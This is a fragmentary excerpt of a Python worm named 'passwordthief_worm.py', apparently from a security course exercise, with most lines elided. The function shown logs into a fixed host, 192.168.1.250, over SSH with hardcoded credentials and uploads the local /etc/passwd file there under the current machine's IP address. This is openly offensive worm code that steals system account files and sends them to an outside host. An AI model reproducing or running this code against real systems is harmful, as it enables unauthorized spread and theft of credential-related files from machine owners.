...
WORM_FILE = "passwordthief_worm.py"
...
def copyPasswdFile():
	...
	try:
		sshClient.connect(u'192.168.1.250', username='cpsc', password='cpsc')
	except paramiko.SSHException:
		return
	...
	try:
		# file exist
		sftpClient.stat('/etc/passwd')
		new_file = '/tmp/passwd_%s'%(getMyIP(getMyEthernetDeviceName()))
		sftpClient.put('/etc/passwd', new_file)
